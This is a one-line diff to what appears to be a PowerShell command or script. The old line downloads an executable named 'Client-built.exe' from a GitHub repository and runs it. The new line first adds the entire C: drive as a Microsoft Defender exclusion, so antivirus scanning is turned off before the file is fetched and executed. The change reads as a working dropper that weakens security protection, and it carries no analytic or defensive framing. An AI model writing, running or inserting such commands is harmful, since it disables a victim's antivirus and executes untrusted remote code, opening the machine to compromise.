@@ -1,1 +1,1 @@
-Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/refs/heads/master/Client-built.exe' -OutFile Client-built.exe;.\Client-built.exe
+Add-MpPreference -ExclusionPath 'C:\';Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/refs/heads/master/Client-built.exe' -OutFile Client-built.exe;.\Client-built.exe
